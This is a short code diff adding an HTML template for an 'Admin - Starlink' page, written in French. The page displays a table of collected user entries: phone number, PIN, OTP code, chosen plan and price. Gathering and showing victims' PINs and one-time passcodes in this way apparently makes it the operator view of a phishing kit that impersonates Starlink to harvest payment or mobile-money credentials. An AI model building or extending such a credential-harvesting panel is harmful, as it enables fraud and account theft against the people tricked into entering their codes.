@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin - Starlink</title>
+    <style>
+        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
+        table { width: 100%; background: white; border-collapse: collapse; }
+        th { background: #4a3b8c; color: white; padding: 10px; }
+        td { padding: 10px; border-bottom: 1px solid #ddd; }
+    </style>
+</head>
+<body>
+    <h1>📊 Données Utilisateurs</h1>
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>Date</th>
+            <th>Téléphone</th>
+            <th>PIN</th>
+            <th>OTP</th>
+            <th>Forfait</th>
+            <th>Prix</th>
+        </tr>
+        {% for entry in entries %}
+        <tr>
+            <td>{{ entry.id }}</td>
+            <td>{{ entry.entry_date }}</td>
+            <td>{{ entry.phone_number }}</td>
+            <td>{{ entry.pin_code }}</td>
+            <td>{{ entry.otp_code }}</td>
+            <td>{{ entry.selected_plan }}</td>
+            <td>{{ entry.plan_price }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
